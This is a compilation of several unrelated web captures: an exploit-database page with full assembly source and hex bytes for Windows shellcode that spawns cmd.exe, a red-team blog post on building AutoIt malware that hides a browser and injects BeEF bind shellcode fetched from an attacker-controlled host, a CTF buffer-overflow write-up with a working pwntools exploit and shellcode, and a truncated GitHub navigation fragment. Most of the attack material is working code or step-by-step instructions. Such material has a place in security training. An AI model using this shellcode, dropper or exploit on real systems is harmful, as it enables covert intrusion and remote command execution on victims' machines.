{"text":"[tr?id=871142820150272&ev=PageView&noscript=1]\nLogo\nLucene search\n* Lucene search\n* Search by product\n* Elastic search\n__________________________________________________________________\n____________________\n(BUTTON) Subscribe (BUTTON)\n(BUTTON)\nK\n(BUTTON) Start 30-day trial (BUTTON)\nDatabase\nVendors\nProducts\nYears\nCVSS\nScanner\nAgent Scanning\nAPI Scanning\nManual Audit\nPerimeter Scanner\nScanning\nProjects\nEmail\nWebhook\nPlugins\nResources\nDocuments\nBlog\nGlossary\nFAQ\nPricing\nContacts\nAbout Us\nPartners\nBranding Guideline\nSIGN IN\nzdt\nFilippo Bersani1337DAY-ID-27788\nHistoryMay 17, 2017 - 12:00 a.m.\n__________________________________________________________________\nWindows x32 \/ Windows x64 - cmd.exe Shellcode (718 bytes)\n2017-05-1700:00:00\nFilippo Bersani\n0day.today\n370\n[1]JSON\n(BUTTON)\n(;Full tutorial: https:\/\/www.zinzloun.info [#Windows CMD shellcode] ;CO\nMPILE: ;nasm.exe [-f win32] dynamic.asm -o dynamic.obj ;SKIP -f win32 t\no create the .obj file to extract eventually the hex code ;then execute\n: [python bin2hex.py dynamic.obj] to get the hex code: ;\"\\x31\\xc9\\x64\\x\n8b\\x41\\x30\\x8b\\x40\\x0c\\x8b\\x40\\x1c\\x8b\\x04\\x08\" ;\"\\x8b\\x04\\x08\\x8b\\x58\\\nx08\\x8b\\x53\\x3c\\x01\\xda\\x8b\\x52\\x78\\x01\" ;\"\\xda\\x8b\\x72\\x20\\x01\\xde\\x41\n\\xad\\x01\\xd8\\x81\\x38\\x47\\x65\\x74\" ;\"\\x50\\x75\\xf4\\x81\\x78\\x04\\x72\\x6f\\x6\n3\\x41\\x75\\xeb\\x81\\x78\\x08\" ;\"\\x64\\x64\\x72\\x65\\x75\\xe2\\x49\\x8b\\x72\\x24\\x\n01\\xde\\x66\\x8b\\x0c\" ;\"\\x4e\\x8b\\x72\\x1c\\x01\\xde\\x8b\\x14\\x8e\\x01\\xda\\x89\\\nxd6\\x31\\xc9\" ;\"\\x51\\x68\\x45\\x78\\x65\\x63\\x68\\x41\\x57\\x69\\x6e\\x89\\xe1\\x8d\n\\x49\" ;\"\\x01\\x51\\x53\\xff\\xd6\\x87\\xfa\\x89\\xc7\\x31\\xc9\\x51\\x68\\x72\\x65\" ;\n\"\\x61\\x64\\x68\\x69\\x74\\x54\\x68\\x68\\x41\\x41\\x45\\x78\\x89\\xe1\\x8d\" ;\"\\x49\\x\n02\\x51\\x53\\xff\\xd6\\x89\\xc6\\x31\\xc9\\x51\\x68\\x65\\x78\\x65\" ;\"\\x20\\x68\\x63\\\nx6d\\x64\\x2e\\x89\\xe1\\x6a\\x01\\x51\\xff\\xd7\\x31\\xc9\" ;\"\\x51\\xff\\xd6\" ;you c\nan download the python script here: https:\/\/github.com\/zinzloun\/infoSec\n\/blob\/master\/bin2hex.py ;LINK ;GoLink.exe \/console \/entry _start dynami\nc.obj ;IF THE obj FILE IS NOT CREATED WITH THE -f win32 GoLink will COM\nPLAIN ;Tested and coded on Win10 Home edition 64, tested also on: Win7\nEE 32, Win Srv 2012 R2 64 [BITS 32] [SECTION .text] global _start _star\nt: ;FIND Kernel32 BASE ADDRESS xor ecx, ecx ; trick to avoid null byte\nMOV EAX,[FS:0x30], we add ecx MOV EAX, [FS:ecx+0x30] ; EAX = PEB MOV EA\nX, [eax+0x0C] ; EAX = PEB->Ldr MOV EAX, [EAX+0x1C] ; EAX = PEB->Ldr.InI\nnitializationOrderModuleList.Flink ; Start to move the pointer 2 positi\nons ahead mov eax, [eax+ecx] ; EAX = LDR 2nd entry -> KernelBA * + ecx\nto avoid NULL mov eax, [eax+ecx] ; EAX = LDR 3rd entry -> Kernel32 ; En\nd move MOV EBX, [EAX+8] ; EBX = LDR_MODULE's BaseAddress Kernel32 ;Find\nthe EXPORT TABLE of kernel32.dll mov edx, [ebx + 0x3c] ; EDX = DOS->e_\nlfanew (offset 60) add edx, ebx ; EDX = PE Header (1) mov edx, [edx + 0\nx78] ; EDX = Offset export table (offset 120) add edx, ebx ; EDX = Expo\nrt table (data type IMAGE_EXPORT_DIRECTORY) (2), we will use this value\nlater (*) mov esi, [edx + 0x20] ; ESI = Relative offset to AddressOfNa\nmes add esi, ebx ; ESI = AddressOfNames (3) ;Find GetProcAddress functi\non name (the ordinal) Find_GetProc: inc ecx ; Increment the counter (we\nstart from 1) ; lodsd instruction will follow the pointer specified by\nthe ESI register and set result in the EAX, this means that after the\nlodsd ; instruction we will have the offset of the current name functio\nn in EAX. ; the instruction will also increment the esi register value\nwith 4, so ESI will already point to next function name offset lodsd ad\nd eax, ebx ; Get function name (offset + base a) cmp dword [eax], 0x507\n46547 ; PteG ->search first 4 bytes of the string GetProcAddre in littl\ne-endian format jnz Find_GetProc cmp dword [eax + 0x4], 0x41636f72 ; Ac\nor ->other 4 bytes jnz Find_GetProc cmp dword [eax + 0x8], 0x65726464 ;\nerdd ->other 4 bytes. At this point even without checking the last 2 b\nytes (ss) of the function name we assume it is GetProcAddress jnz Find_\nGetProc dec ecx ; we start counting from 1 but the adrress index start\nfrom 0 so we need to decrement ECX ; now ECX points to the array index\nof AddressOfNames and we can obtain the ordinal value in this way: Addr\nessOfNameOrdinals[ecx] = ordinal ;Find the address of GetProcAddress fu\nnction mov esi, [edx + 0x24] ; ESI = Offset to AddressOfNameOrdinals (4\n)(*) add esi, ebx ; ESI = AddressOfNameOrdinals mov cx, [esi + ecx * 2]\n; CX (lower word of ECX 16bit) = AddressOfNameOrdinals contains two by\nte numbers value (the ordinal), so we only need of the lower word of EC\nX ; CX (16bit == 2byte). This value is the link (the index) to the Addr\nessOfFunctions ; so CX now points to the Number of function (ordinal) t\nhat corresponds to the GetProcAddress address value in the AddressOfFun\nctions mov esi, [edx + 0x1c] ; ESI = Offset to AddressOfFunctions (5) a\ndd esi, ebx ; ESI = AddressOfFunctions mov edx, [esi + ecx * 4] ; EDX =\nOffset to GetProcAddress function address: AddressOfFunctions[ecx*4] ;\nWe set ecx * 4 because each address pointer has 4 bytes reserved and E\nSI points to the beginning of AddressOfFunctions array add edx, ebx ; E\nDX = GetProcAddress ;EDX WILL CHANGE AFTER THE CALL mov esi, edx ; stor\ne GetProcAddress in ESI ;Finding address of Winexec calling GetProcAddr\ness(base kernel32,\"Winexec\\0\") xor ecx,ecx push ecx ;another trick to a\nvoid null bytes: prefix the Winexec string with A to keep the stack ali\ngned without null ;we load AWinexec push 0x63657845 push 0x6e695741 mov\necx,esp lea ecx, [ecx+1] ; get rid of 41(A) push ecx ; Winexec\\0 push\nebx ; Base kernel32 call esi ;Call GetProcAddress: the return result is\nsaved in EAX xchg edi,edx mov edi, eax;save Winexec address in EDI ;Fi\nnding address of ExitThread calling GetProcAddress(base kernel32,\"ExitT\nhread\\0\") xor ecx,ecx push ecx ;the same trick used before for WinExec\nPUSH 0x64616572 PUSH 0x68547469 PUSH 0x78454141 mov ecx,esp lea ecx, [e\ncx+2] ; get rid of 4141(AA) push ecx ; ExitThread\\0 push ebx ; Base ker\nnel32 call esi ;Call GetProcAddress: the return result is saved in EAX\nmov esi, eax;save ExitThread address in esi (overwrite GetProcAddress s\nince we don't need anymore) ;Finally call cmd.exe\\0 xor ecx,ecx push ec\nx push 0x20657865 push 0x2e646d63 mov ecx,esp ; \"cmd.exe \\0\" push 0x1 ;\nwindows style push ecx call edi ; WinExec(\"cmd.exe \\0\",1) ;exit clean\nxor ecx,ecx push ecx call esi ; ExitThread(0))\n;Full tutorial: https:\/\/www.zinzloun.info [#Windows CMD shellcode]\n;COMPILE:\n;nasm.exe [-f win32] dynamic.asm -o dynamic.obj\n;SKIP -f win32 to create the .obj file to extract eventually the hex code\n;then execute: [python bin2hex.py dynamic.obj] to get the hex code:\n;\"\\x31\\xc9\\x64\\x8b\\x41\\x30\\x8b\\x40\\x0c\\x8b\\x40\\x1c\\x8b\\x04\\x08\"\n;\"\\x8b\\x04\\x08\\x8b\\x58\\x08\\x8b\\x53\\x3c\\x01\\xda\\x8b\\x52\\x78\\x01\"\n;\"\\xda\\x8b\\x72\\x20\\x01\\xde\\x41\\xad\\x01\\xd8\\x81\\x38\\x47\\x65\\x74\"\n;\"\\x50\\x75\\xf4\\x81\\x78\\x04\\x72\\x6f\\x63\\x41\\x75\\xeb\\x81\\x78\\x08\"\n;\"\\x64\\x64\\x72\\x65\\x75\\xe2\\x49\\x8b\\x72\\x24\\x01\\xde\\x66\\x8b\\x0c\"\n;\"\\x4e\\x8b\\x72\\x1c\\x01\\xde\\x8b\\x14\\x8e\\x01\\xda\\x89\\xd6\\x31\\xc9\"\n;\"\\x51\\x68\\x45\\x78\\x65\\x63\\x68\\x41\\x57\\x69\\x6e\\x89\\xe1\\x8d\\x49\"\n;\"\\x01\\x51\\x53\\xff\\xd6\\x87\\xfa\\x89\\xc7\\x31\\xc9\\x51\\x68\\x72\\x65\"\n;\"\\x61\\x64\\x68\\x69\\x74\\x54\\x68\\x68\\x41\\x41\\x45\\x78\\x89\\xe1\\x8d\"\n;\"\\x49\\x02\\x51\\x53\\xff\\xd6\\x89\\xc6\\x31\\xc9\\x51\\x68\\x65\\x78\\x65\"\n;\"\\x20\\x68\\x63\\x6d\\x64\\x2e\\x89\\xe1\\x6a\\x01\\x51\\xff\\xd7\\x31\\xc9\"\n;\"\\x51\\xff\\xd6\"\n;you can download the python script here: https:\/\/github.com\/zinzloun\/infoSec\/b\nlob\/master\/bin2hex.py\n;LINK\n;GoLink.exe \/console \/entry _start dynamic.obj\n;IF THE obj FILE IS NOT CREATED WITH THE -f win32 GoLink will COMPLAIN\n;Tested and coded on Win10 Home edition 64, tested also on: Win7 EE 32, Win Srv\n2012 R2 64\n[BITS 32]\n[SECTION .text]\nglobal _start\n_start:\n;FIND Kernel32 BASE ADDRESS\nxor ecx, ecx            ; trick to avoid null byte MOV EAX,[FS:0x30], we add ecx\nMOV EAX, [FS:ecx+0x30]  ; EAX = PEB\nMOV EAX, [eax+0x0C]     ; EAX = PEB->Ldr\nMOV EAX, [EAX+0x1C]     ; EAX = PEB->Ldr.InInitializationOrderModuleList.Flink\n; Start to move the pointer 2 positions ahead\nmov eax, [eax+ecx]      ;  EAX = LDR 2nd entry -> KernelBA * + ecx to avoid NULL\nmov eax, [eax+ecx]      ;  EAX = LDR 3rd entry -> Kernel32\n; End move\nMOV EBX, [EAX+8]        ; EBX = LDR_MODULE's BaseAddress Kernel32\n;Find the EXPORT TABLE of kernel32.dll\nmov edx, [ebx + 0x3c] ; EDX = DOS->e_lfanew (offset 60)\nadd edx, ebx          ; EDX = PE Header (1)\nmov edx, [edx + 0x78] ; EDX = Offset export table (offset 120)\nadd edx, ebx          ; EDX = Export table (data type IMAGE_EXPORT_DIRECTORY) (2\n), we will use this value later (*)\nmov esi, [edx + 0x20] ; ESI = Relative offset to AddressOfNames\nadd esi, ebx          ; ESI = AddressOfNames (3)\n;Find GetProcAddress function name (the ordinal)\nFind_GetProc:\ninc ecx                              ; Increment the counter (we start from 1)\n; lodsd instruction will follow the pointer\nspecified by the ESI register and set result in the EAX, this means that after\nthe lodsd\n; instruction we will have the offset of th\ne current name function in EAX.\n; the instruction will also increment the e\nsi register value with 4, so ESI will already point to next function name offset\nlodsd\nadd eax, ebx                        ; Get function name (offset + base a)\ncmp dword [eax], 0x50746547         ; PteG ->search first 4 bytes of the string\nGetProcAddre in little-endian format\njnz Find_GetProc\ncmp dword [eax + 0x4], 0x41636f72   ; Acor ->other 4 bytes\njnz Find_GetProc\ncmp dword [eax + 0x8], 0x65726464   ; erdd ->other 4 bytes. At this point even w\nithout checking the last 2 bytes (ss) of the function name we assume it is GetPr\nocAddress\njnz Find_GetProc\ndec ecx                             ; we start counting from 1 but the adrress i\nndex start from 0 so we need to decrement ECX\n; now ECX points to the array index of Addre\nssOfNames and we can obtain the ordinal value in this way: AddressOfNameOrdinals\n[ecx] = ordinal\n;Find the address of GetProcAddress function\nmov esi, [edx + 0x24]    ; ESI = Offset to AddressOfNameOrdinals (4)(*)\nadd esi, ebx             ; ESI = AddressOfNameOrdinals\nmov cx, [esi + ecx * 2]  ; CX (lower word of ECX 16bit) = AddressOfNameOrdinals\ncontains two byte numbers value (the ordinal), so we only need of the lower word\nof ECX\n;  CX (16bit == 2byte). This value is the link (the ind\nex) to the AddressOfFunctions\n;  so CX now points to the Number of function (ordinal)\nthat corresponds to the GetProcAddress address value in the AddressOfFunctions\nmov esi, [edx + 0x1c]    ; ESI = Offset to AddressOfFunctions (5)\nadd esi, ebx             ; ESI = AddressOfFunctions\nmov edx, [esi + ecx * 4] ; EDX = Offset to GetProcAddress function address: Addr\nessOfFunctions[ecx*4]\n;  We set ecx * 4 because each address pointer has 4 by\ntes reserved and ESI points to the beginning of AddressOfFunctions array\nadd edx, ebx             ; EDX = GetProcAddress\n;EDX WILL CHANGE AFTER THE CALL\nmov esi, edx             ; store GetProcAddress in ESI\n;Finding address of Winexec calling GetProcAddress(base kernel32,\"Winexec\\0\")\nxor ecx,ecx\npush ecx\n;another trick to avoid null bytes: prefix the Winexec string with A to keep the\nstack aligned without null\n;we load AWinexec\npush 0x63657845\npush 0x6e695741\nmov ecx,esp\nlea ecx, [ecx+1] ; get rid of 41(A)\npush ecx    ; Winexec\\0\npush ebx    ; Base kernel32\ncall esi    ;Call GetProcAddress: the return result is saved in EAX\nxchg edi,edx\nmov edi, eax;save Winexec address in EDI\n;Finding address of ExitThread calling GetProcAddress(base kernel32,\"ExitThread\\\n0\")\nxor ecx,ecx\npush ecx\n;the same trick used before for WinExec\nPUSH 0x64616572\nPUSH 0x68547469\nPUSH 0x78454141\nmov ecx,esp\nlea ecx, [ecx+2] ; get rid of 4141(AA)\npush ecx    ; ExitThread\\0\npush ebx    ; Base kernel32\ncall esi    ;Call GetProcAddress: the return result is saved in EAX\nmov esi, eax;save ExitThread address in esi (overwrite GetProcAddress since we d\non't need anymore)\n;Finally call cmd.exe\\0\nxor ecx,ecx\npush ecx\npush 0x20657865\npush 0x2e646d63\nmov ecx,esp ; \"cmd.exe \\0\"\npush 0x1    ; windows style\npush ecx\ncall edi    ; WinExec(\"cmd.exe \\0\",1)\n;exit clean\nxor ecx,ecx\npush ecx\ncall esi    ; ExitThread(0)\n(BUTTON)\nHow to find holes in your network?\nTry incredible fast Vulners Perimeter Scanner and find vulnerabilities\nand unnecessary ip and ports in network devices inside your network\nbefore anyone else.\n[2]Try Network Scanner\nvulners-logo-small\nProducts\n* [3]Security Intelligence\n* [4]Non-intrusive assessment\n* [5]Developers SDK\n* [6]Windows scanner\n* [7]Linux scanner\n* [8]Perimeter control tool\nDatabase\n* [9]Vulnerabilities\n* [10]Exploits\n* [11]IOC\n* [12]Security News\n* [13]BugBounty\n* [14]Popular\n* [15]Wild Exploited\nTools\n* [16]Linux Security Scanner\n* [17]API integration\n* [18]Subscriptions\n* [19]Plugins\n* [20]Manual Audit\nLearn More\n* [21]Stats\n* [22]API\n* [23]Docs\n* [24]Api-keys\n* [25]License\n* [26]Pricing\n* [27]Glossary\n* [28]FAQ\nCompany\n* [29]Blog\n* [30]Contacts\n* [31]About Us\n* [32]OpenSource\n* [33]EULA\n* [34]Brand Guideline\n* [35]Privacy Policy\nThis site is protected by reCAPTCHA and the Google [36]Privacy Policy\nand [37]Terms of Service apply. All product names, logos, and brands\nare property of their respective owners. All company, product and\nservice names used in this website are for identification purposes\nonly. Use of these names, logos, and brands does not imply\nendorsement.If you are an owner of some content and want it to be\nremoved,[38] please contact us. Using Vulners services you are\naccepting [39]Vulners services end-user license agreement\n@2024 Vulners Inc\n[40]JSON\nIFRAME: [41]https:\/\/www.googletagmanager.com\/ns.html?id=GTM-WFZTQKWZ"}
{"text":"#[1]Medium [2]alternate\n[3]Open in app\n(BUTTON) Sign up\n[4]Sign in\n____________________\nWrite\n(BUTTON) Sign up\n[5]Sign in\n(BUTTON)\nRed Team Diary, Entry #3: Custom Malware Development (Establishing A Shell\nThrough the Target\u2019s Browser)\nDimitrios Bougioukas\n[6]Dimitrios Bougioukas\n\u00b7\n[7]Follow\n6 min read\n\u00b7\nNov 28, 2019\n--\n(BUTTON)\n(BUTTON)\nListen\n(BUTTON)\nShare\nHi there,\nThis is Dimitrios Bougioukas, Director of IT Security Training Services\nat [8]eLearnSecurity.\nOur series of (red and blue team) posts continues with the third entry\nof the Red Team Diary. Everything you will read below is part of our[9]\nPenetration Testing eXtreme course. A course oriented solely towards\nred team operations.\nIn this post I will demonstrate how you can develop your own custom\nmalware that establishes a shell through the target\u2019s browser. We chose\nto abuse the target\u2019s browser so that any traffic back to us will look\nlike legitimate web page browsing.\nDuring our custom malware development activities we will repurpose\n[10]BeEF\u2019s bind shellcode, modify BeEF\u2019s (0.4.7.0-alpha) backend and\nalso leverage [11]AutoIt.\nBeEF Bind Shellcode Background\nBeEF\u2019s bind shellcode is used to establish a shell through a target\u2019s\nbrowser. It was originally created for [12]inter-protocol exploitation\nscenarios. This means the target should not only have specific software\ninstalled (where BeEF\u2019s bind shellcode exploits apply) but he\/she\nshould also install a malicious browser extension, which would bypass\nport banning, among other things. Too many requirements \u2026\nThe attack\u2019s stager and stage payload are contained into BeEF\u2019s Eudora\nMail 3 and Active Fax 5.01 exploits.\nOur Version of the Attack\nWe will modify BeEF\u2019s Eudora Mail 3 exploit and create a variation of\nthis attack, which applies on all social engineering cases and doesn\u2019t\nrequire any installed software or browser extension from the target. We\nwill actually create and send a malicious executable that will inject\nthe attack\u2019s stager into the target\u2019s memory. Then, we will manually\nsend the attack\u2019s stage payload, using BeEF.\nThis way, we free ourselves from the requirement of specific software\nand a browser extension being installed on the target. Note that\neverything will occur from a single attack vector.\nAll the attack stages are depicted in the following diagram.\nOur custom malware will perform the below steps:\n[3a] Spawn a hidden Firefox instance that will automatically visit an\nattacker-controlled web page serving BeEF\u2019s hook.\n[3b] Fetch BeEF\u2019s bind shellcode from a remote attacker-controlled\nresource and inject it into the target\u2019s memory (the selected port is\nnow bound)\uf0b7\n[4] Receive the stage payload (sent by the attacker) through the\n(hidden) hooked browser\n[5] Receive commands to be executed and send their result through the\n(hidden) hooked browser\nLet\u2019s start developing our malware\u2026\nStep 1: The first step is to copy BeEF\u2019s bind shellcode modules from\n\/beef\/modules\/exploits\/beefbind\/shellcode_sources\/msf to the\nappropriate Metasploit (MSF4) folders (on kali rolling you can find the\nMetasploit folders on \/usr\/share\/Metasploit-framework\/\u2026). This way you\ncan use the Metasploit framework to not only generate BeEF bind\nshellcode stagers in multiple formats but also for re-encoding or\nremoving bad characters.\nNow, that BeEF\u2019s bind shellcode modules are inside Metasploit, you can\ncreate stagers in multiple formats, using numerous ways of encoding. We\nchoose to use PowerShell and reflection in order to minimize the\non-disk footprint (psh-reflection format).\nMore specifically:\nAll you have to do is follow the instructions placed in\n\/beef\/modules\/exploits\/beefbind\/shellcode_sources\/msf\/instructions.txt\nWith BeEF bind shellcode modules inside Metasploit, you can use\nmsfvenom to create the attack\u2019s stager.\nBy executing the following command, you will create a PowerShell based\nBeEF bind shellcode stager, which is also A\/V resistant since it\nleverages .NET\u2019s reflection capability. The psh-reflection format\nleverages .NET\u2019s reflection, so there is no need for a temporary .cs\nfile to be dropped for dynamic compilation.\nStep 2: As already mentioned we will need to spawn a hidden Firefox\ninstance that will visit an attacker-controlled web page serving BeEF\u2019s\nhook as well as inject BeEF\u2019s bind shellcode using PowerShell and\nreflection. Let\u2019s automate all the above. We will utilize AutoIt for\nthat. AutoIt is a freeware BASIC-like scripting language designed for\nautomating the Windows GUI and general scripting.\nOnce you install AutoIt, open a notepad and write the following AutoIt\nscript. Then, save it as a .au3 file. Finally, right click on it and\nselect \u201cCompile Script (x86)\u201d.\n[13]https:\/\/gist.github.com\/anonymous\/09f10cdb5d9b0bae4755850273083fd2\nIn this case we knew the target uses Firefox Developer Edition and\nthat PowerShell v1 wasn\u2019t uninstalled. As always detailed and\nthorough reconnaissance is key for stealthy Red Team Ops\u2026\nThe AutoIt script above performs the following:\n1. Targets Firefox Developer Edition. On $path you should enter the\nFirefox\u2019s path.\n2. Uses the 32bit version of PowerShell v1 ($path1).\n3. Spawns a Firefox browser and loads a web page using ShellExecute.\nOnce Firefox is spawned, it is hidden in the background via the WinWait\nand WinSetState commands. Actually, those two commands instruct the\ntarget\u2019s computer that whenever a window comes up with the title\n\u201cFirefox Developer Edition\u201d (the default title of Firefox Developer\nEdition), put it in the background and keep it running.\n4. PowerShell is called using ShellExecute and the stager you created\nin Step 1 is loaded and executed in the target\u2019s memory.\nStep 3: It is about time we modify BeEF\u2019s backend for our attack\npurposes.\nFirst, modify BeEF\u2019s Eudora Mail 3 exploit so you can manually send the\nattack\u2019s stage payload on port 4444 that the stager bound. Navigate to:\n\/beef\/modules\/exploits\/beefbind\/beef_bind_exploits\/eudora_mail_beef_bin\nd\/ and replace command.js with the following version of command.js.\n[14]https:\/\/gist.github.com\/anonymous\/a1befcd2a0acf8fed62aa854e05e0d88\nThe altered command.js above simply skips the if(stager_successfull)\ncheck of the original version and enables us to manually send the\nattack\u2019s stage payload. This will still work, since our own version of\nthe attack\u2019s stager will make the target able to receive the stage\npayload. Be reminded that our attack lifecycle does not have any\nspecific software or browser extension requirements.\nThe attack in action\u2026\nOnce the target executes the AutoIt-derived executable, port 4444 will\nbe bound on his machine and a hidden browser will load a web page with\nBeEF running underneath. Now, to send the attack\u2019s stage payload using\nBeEF perform the following:\nSelect the hooked browser and click on the Commands tab. Then on the\nModule Tree, click Exploits, BeEF_bind and Eudora Mail 3. On the Target\nHost, enter the target\u2019s internal IP (you can identify it using the two\nGet Internal IP modules of BeEF). On BeEF Host enter BeEF\u2019s IP, if you\nare delivering an internal penetration test, or the web page\u2019s domain\nname, if you are delivering an external penetration test. Also change\nBeEF\u2019s port if you have changed it through the config.yaml. Finally,\nclick Execute. This will send the attack\u2019s stage payload on the\ntarget\u2019s 4444 port.\nTo send commands for execution on the target machine, on the Module\nTree, click Exploits, BeEF_bind and BeEF bind shell. On Target Host\nenter the target\u2019s internal IP and on Command, enter the command you\nwant to be executed and have its results returned through the target\u2019s\nbrowser. Finally, on BeEF Bind Shellcode choose Windows and click\nExecute.\nCongrats! You established a stealthy shell through your target\u2019s\nbrowser!\nThe above custom malware is just a Proof Of Concept. Serious\nbrowser-based payloads utilize ActiveX controls (such as Metasploit\u2019s\nPassiveX payload) or IE COM objects (such as\n[15]https:\/\/www.mdsec.co.uk\/2019\/02\/external-c2-ie-com-objects-and-how-\nto-use-them-for-command-and-control\/).\nUntil next time, keep hacking \u2026\n\ud83d\udcdd Read this story later in [16]Journal.\n\ud83d\udc69\u200d\ud83d\udcbb Wake up every Sunday morning to the week\u2019s most noteworthy stories\nin Tech waiting in your inbox. [17]Read the Noteworthy in Tech\nnewsletter.\nCybersecurity\nHacking\nMalware\nInfosec\nRed Team\n--\n--\n(BUTTON)\n(BUTTON)\nDimitrios Bougioukas\n(BUTTON) Follow\n[18](BUTTON)\n[19]\nWritten by Dimitrios Bougioukas\n[20]377 Followers\nDirector, IT Security Training Services @ Hack The Box\n(BUTTON) Follow\n[21](BUTTON)\n[22]\nHelp\n[23]\nStatus\n[24]\nAbout\n[25]\nCareers\n[26]\nBlog\n[27]\nPrivacy\n[28]\nTerms\n[29]\nText to speech\n[30]\nTeams"}
{"text":"The exploit I have here will most lijeky not work if it is copy and pasted without reconfiguring it. Let's take a look at the source code...\n\n```\n#include <stdio.h>\n#include <string.h>\n\nvoid nothing()\n{\n\tchar* buf0[50];\n\tgets(buf0);\n}\n\nint main()\n{\n\tprintf(\"There, now you have less than nothing. Yet you still try. Some would recogmedn a psychologist. I recogmend natural selection\\n\");\n\tnothing();\n}\n```\n\nSo looking at this code, it looks pretty similar to the previous challenge. In fact it is pretty much just a copy and paste of the last challenge. However it is missing one thing that made our lives easy. It is no longer printing out the address of the buffer, so we will have to find that ourselves. Now there are a lot of different methods you could go about finding the address. However that address changes for things such as running at a different privilege level, and if it is in gdb. What we can do for this instance is we can look at the address in gdb. This won't be the exact address, however using that address as a base we should be able to brute force the actual address. Let me show you.\n\n```\ngdb-peda$ disas nothing\nDump of assembler code for function nothing:\n   0x0000000000400536 <+0>:\tpush   rbp\n   0x0000000000400537 <+1>:\tmov    rbp,rsp\n   0x000000000040053a <+4>:\tsub    rsp,0x190\n   0x0000000000400541 <+11>:\tlea    rax,[rbp-0x190]\n   0x0000000000400548 <+18>:\tmov    rdi,rax\n   0x000000000040054b <+21>:\tmov    eax,0x0\n   0x0000000000400550 <+26>:\tcall   0x400420 <gets@plt>\n   0x0000000000400555 <+31>:\tnop\n   0x0000000000400556 <+32>:\tleave  \n   0x0000000000400557 <+33>:\tret    \nEnd of assembler dump.\ngdb-peda$ b *nothing+31\nBreakpoint 1 at 0x400555\ngdb-peda$ r\nStarting program: \/Hackery\/escape\/buf_ovf\/b5_64\/b5_64 \nThere, now you have less than nothing. Yet you still try. Some would recogmedn a psychologist. I recogmend natural selection\n75395128\n```\n\nOne wall of text later...\n\n```\nBreakpoint 1, 0x0000000000400555 in nothing ()\ngdb-peda$ x\/s $rbp-0x190\n0x7fffffffdcc0:\t\"75395128\"\ngdb-peda$ info frame\nStack level 0, frame at 0x7fffffffde60:\n rip = 0x400555 in nothing; saved rip = 0x400570\n called by frame at 0x7fffffffde70\n Arglist at 0x7fffffffde50, args: \n Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60\n Saved registers:\n  rbp at 0x7fffffffde50, rip at 0x7fffffffde58\n ```\n\nSo as you can see the address of the buffer is stored at 0x7fffffffdcc0. The offset we will need to reach the rip register is 408 (0x7fffffffde98 - 0x7fffffffdd00 = 408). If we were to hardcode that address into our exploit the exploit will work, however only when we run it in gdb under the same settings. However if you notice something with all of the subsequent addresses, the are stored in 16 byte increments. If the address that we saw from gdb servers as a rough estimate, then we should be able to move up and down from 0x7fffffffdcc0 untill we find an address that works. Here is a list of the addresses I went through, before I found one that worked.\n\n```\n0x7fffffffdcc0\n0x7fffffffdcb0\n0x7fffffffdca0\n0x7fffffffdc90\n0x7fffffffdc80\n0x7fffffffdc70\n0x7fffffffdc60\n0x7fffffffdc50\n0x7fffffffdc40\n0x7fffffffdc30\n0x7fffffffdc20\n0x7fffffffdc10\n0x7fffffffdcd0\n0x7fffffffdce0\n0x7fffffffdcf0\n```\n\nAnd then I found the address that worked for me, 0x7fffffffdcf0. Here is my exploit script with the address hard coded in (yes it is the same script from the last challenge with one line changed). Keep in mind that we have to adjust the offset to make room for the shellcode, so it will be 408 - 27 = 381.\n\n```\n#Import the pwntools library.\nfrom pwn import *\n\n#The process is like an actualy command you run, so you will have to adjust the path if your exploit isn't in the same directory as the challenge.\ntarget = process(\".\/b5_64\")\n\n#Just receive the first line, which for our purposes isn't important.\ntarget.recvline()\n\n#Hardcode in the address of the buffer\naddress = \"0x7fffffffdcf0\"\n\n#Convert the string to a hexidecimal\naddress = int(address, 16)\n\n#Pack the hexidecimal in little endian for 64 bit systems\naddress = p64(address)\n\n#Store the shellcode in a variable\nshellcode = \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"\n\n#Make the filler to reach the eip register\nfiller = \"0\"*381\n\n#Craft the payload\npayload = shellcode + filler + address\n\n#Send the payload\ntarget.sendline(payload)\n\n#Drop into interactive mode so you can use the shell\ntarget.interactive()\n````\n\nNow let's try out the exploit...\n\n```\nguyinatuxedo@tux:\/Hackery\/escape\/buf_ovf\/b5_64$ python exploit.py \n[+] Starting local process '.\/b5_64': Done\n[*] Switching to interactive mode\n$ ls\nReadme.md  b5_64  b5_64.c  core  exploit.py  in  out  peda-session-b5_64.txt\n$ cat out\nIf you don't stop trying to leave, we can't have a celebration for you. Level Cleared!\n\n```\n\nAnd just like that we pwned the binary. \n"}
{"text":"#[1]GitHub\n[2]Skip to content\n(BUTTON) Toggle navigation\n[3]Sign in\n(BUTTON)\n* (BUTTON) Product\n+ Actions\nAutomate any workflow\n+ Packages\nHost and manage packages\n+ Security\nFind and fix vulnerabilities\n+ Codespaces\nInstant dev environments\n+ Copilot\nWrite better code with AI\n+ Code review\nManage code changes\n+ Issues\nPlan and track work\n+ Discussions\nCollaborate outside of code\nExplore\n+ [4]All features\n+ [5]Documentation\n+ [6]GitHub Skills\n+ [7]Blog\n* (BUTTON) Solutions\nFor\n+ [8]Enterprise\n+ [9]Teams\n+ [10]Startups\n+ [11]Education\nBy Solution\n+ [12]CI\/CD & Automation\n+ [13]DevOps\n+ [14]DevSecOps\nResources\n+ [15]Learning Pathways\n+ [16]White papers, Ebooks, Webinars\n+ [17]Customer Stories\n+ [18]Partners\n* (BUTTON) Open Source\n+ GitHub Sponsors\nFund open source developers\n+ The ReadME Project\nGitHub community articles\nRepositories\n+ [19]Topics\n+ [20]Trending\n+ [21]Collections\n* [22]Pricing\n(BUTTON)\nSearch or jump to...\nSearch code, repositories, users, issues, pull requests...\nSearch\n____________________\nClear (BUTTON)\n[23]Search syntax tips\nProvide feedback\n(BUTTON)\nWe read every piece of feedback, and take your input very seriously.\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n[ ] Include my email address so I can be contacted\n(BUTTON) Cancel (BUTTON) Submit feedback\nSaved searches\nUse saved searches to filter your results more quickly\n(BUTTON)\nName ____________________\nQuery ____________________\nTo see all available qualifiers, see our [24]documentation.\n(BUTTON) Cancel (BUTTON) Create saved search\n[25]Sign in\n[26]Sign up\nYou signed in with another tab or window. [27]Reload to refresh your\nsession. You signed out in another tab or window. [28]Reload to refresh\nyour session. You switched accounts on another tab or 